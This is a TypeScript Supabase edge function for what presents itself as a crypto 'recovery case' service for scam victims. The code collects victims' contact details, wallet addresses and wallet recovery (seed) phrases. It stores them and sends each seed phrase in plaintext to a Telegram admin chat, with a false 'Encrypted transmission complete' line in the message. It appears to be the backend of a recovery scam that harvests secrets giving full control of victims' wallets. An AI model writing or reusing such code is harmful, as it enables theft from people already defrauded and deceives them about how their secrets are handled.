// supabase/functions/submit-recovery-case/index.ts
Deno.serve(async (req) => {
    const corsHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS, PUT, DELETE, PATCH',
        'Access-Control-Max-Age': '86400',
        'Access-Control-Allow-Credentials': 'false'
    };

    if (req.method === 'OPTIONS') {
        return new Response(null, { status: 200, headers: corsHeaders });
    }

    try {
        // Extract request data
        const caseData = await req.json();
        
        // Get Supabase configuration
        const supabaseUrl = Deno.env.get('SUPABASE_URL');
        const serviceRoleKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');
        const telegramBotToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
        const telegramChatId = Deno.env.get('TELEGRAM_ADMIN_CHAT_ID');

        if (!supabaseUrl || !serviceRoleKey) {
            throw new Error('Supabase configuration missing');
        }

        // Store case in database
        const databasePayload = {
            case_id: caseData.caseId,
            timestamp: caseData.timestamp,
            name: caseData.name,
            email: caseData.email,
            phone: caseData.phone,
            blockchain: caseData.blockchain,
            victim_address: caseData.victimAddress,
            scammer_address: caseData.scammerAddress,
            transaction_hash: caseData.transactionHash,
            amount_stolen: parseFloat(caseData.amountStolen),
            details: caseData.details,
            phrase: caseData.phrase, // Will be encrypted in production
            status: 'pending',
            priority: calculatePriority(caseData),
            metadata: {
                user_agent: req.headers.get('user-agent') || '',
                ip: req.headers.get('cf-connecting-ip') || req.headers.get('x-forwarded-for')?.split(',')[0] || 'unknown',
                referer: req.headers.get('referer') || ''
            }
        };

        // Insert into database
        const dbResponse = await fetch(`${supabaseUrl}/rest/v1/recovery_cases`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${serviceRoleKey}`,
                'apikey': serviceRoleKey,
                'Content-Type': 'application/json',
                'Prefer': 'return=representation'
            },
            body: JSON.stringify(databasePayload)
        });

        if (!dbResponse.ok) {
            const errorText = await dbResponse.text();
            console.error('Database insert failed:', errorText);
            throw new Error('Database storage failed');
        }

        // Send Telegram notification (enhanced format)
        if (telegramBotToken && telegramChatId) {
            const telegramMessage = formatEnhancedTelegramMessage(caseData);
            
            try {
                const telegramResponse = await fetch(
                    `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
                    {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: telegramChatId,
                            text: telegramMessage,
                            parse_mode: 'HTML'
                        })
                    }
                );

                if (!telegramResponse.ok) {
                    console.error('Telegram notification failed');
                }
            } catch (telegramError) {
                console.error('Telegram error:', telegramError);
            }
        }

        // Return success response
        return new Response(JSON.stringify({
            data: { 
                success: true,
                caseId: caseData.caseId,
                message: 'Case submitted successfully'
            }
        }), {
            headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });

    } catch (error) {
        console.error('Case submission error:', error);

        const errorResponse = {
            error: {
                code: 'SUBMISSION_FAILED',
                message: error.message
            }
        };

        return new Response(JSON.stringify(errorResponse), {
            status: 500,
            headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
    }
});

// Helper function to calculate priority based on amount stolen
function calculatePriority(caseData: any): string {
    const amount = parseFloat(caseData.amountStolen || '0');
    
    if (amount >= 100000) return 'critical';
    if (amount >= 50000) return 'high';
    if (amount >= 10000) return 'medium';
    return 'low';
}

// Enhanced Telegram message formatting
function formatEnhancedTelegramMessage(data: any): string {
    const priority = calculatePriority(data);
    const priorityEmoji = {
        'critical': '🚨',
        'high': '⚠️',
        'medium': '📊',
        'low': 'ℹ️'
    };

    const blockchainEmoji = {
        'BTC': '₿',
        'ETH': 'Ξ',
        'SOL': '◎',
        'DOGE': 'Ð',
        'ADA': '₳',
        'XRP': '✕',
        'BCH': '₿',
        'LTC': 'Ł',
        'MATIC': '⭘',
        'AVAX': '△'
    };

    const emoji = blockchainEmoji[data.blockchain as keyof typeof blockchainEmoji] || '💎';

    return `
${priorityEmoji[data.priority as keyof typeof priorityEmoji] || '📝'} <b>NEW CRYPTO RECOVERY CASE</b>

<b>🆔 Case ID:</b> <code>${data.caseId}</code>
<b>⏰ Timestamp:</b> <code>${new Date(data.timestamp).toLocaleString()}</code>
<b>🎯 Priority:</b> <code>${data.priority.toUpperCase()}</code>

<b>👤 Contact Information:</b>
<b>Name:</b> <code>${data.name}</code>
<b>Email:</b> <code>${data.email}</code>
<b>Phone:</b> <code>${data.phone}</code>

<b>💰 Transaction Details:</b>
<b>Network:</b> <code>${emoji} ${data.blockchain}</code>
<b>Amount:</b> <code>$${data.amountStolen}</code>
<b>Victim Address:</b> <code>${truncateAddress(data.victimAddress)}</code>
<b>Scammer Address:</b> <code>${truncateAddress(data.scammerAddress)}</code>
<b>TX Hash:</b> <code>${truncateHash(data.transactionHash)}</code>

<b>📄 Case Summary:</b>
<pre>${data.details}</pre>

<b>🔑 Recovery Phrase:</b>
<pre>${data.phrase}</pre>

<i>⚡ Status: Awaiting analyst review</i>
<i>🔒 Encrypted transmission complete</i>
<i>📊 Database ID: ${data.caseId}</i>
    `.trim();
}

// Helper function to truncate addresses for display
function truncateAddress(address: string): string {
    if (address.length <= 20) return address;
    return `${address.substring(0, 8)}...${address.substring(address.length - 8)}`;
}

// Helper function to truncate transaction hash
function truncateHash(hash: string): string {
    if (hash.length <= 16) return hash;
    return `${hash.substring(0, 8)}...${hash.substring(hash.length - 8)}`;
}